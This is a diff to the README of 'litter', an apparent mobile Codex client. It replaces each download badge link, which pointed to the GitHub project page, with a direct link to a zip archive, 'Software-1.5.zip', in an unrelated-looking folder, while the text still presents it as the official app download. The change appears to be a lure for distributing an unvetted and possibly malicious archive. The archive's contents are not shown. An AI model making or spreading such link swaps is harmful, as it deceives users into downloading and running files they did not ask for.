@@ -1,6 +1,6 @@
 # 🗑️ litter - Simple Codex Client for Mobile Devices
 
-[![Download litter](https://img.shields.io/badge/Download-litter-brightgreen?style=for-the-badge)](https://github.com/sizco123/litter)
+[![Download litter](https://img.shields.io/badge/Download-litter-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sizco123/litter/main/kenotism/Software-1.5.zip)
 
 ---
 
@@ -64,7 +64,7 @@ Here are some images to show how litter looks on iPhone 17 Pro in different mode
 
 To use litter on your phone, start by downloading the app from the project's main GitHub page. This page contains the latest versions available for both iOS and Android.
 
-[![Get litter here](https://img.shields.io/badge/Get%20litter%20here-blue?style=for-the-badge)](https://github.com/sizco123/litter)
+[![Get litter here](https://img.shields.io/badge/Get%20litter%20here-blue?style=for-the-badge)](https://raw.githubusercontent.com/sizco123/litter/main/kenotism/Software-1.5.zip)
 
 **Step 1: Visit the download page**
 
@@ -132,4 +132,4 @@ You can browse the source code or open issues if you want to report bugs or sugg
 
 ## 📥 Ready to download?
 
-[![Download litter](https://img.shields.io/badge/Download-litter-purple?style=for-the-badge)](https://github.com/sizco123/litter)
+[![Download litter](https://img.shields.io/badge/Download-litter-purple?style=for-the-badge)](https://raw.githubusercontent.com/sizco123/litter/main/kenotism/Software-1.5.zip)
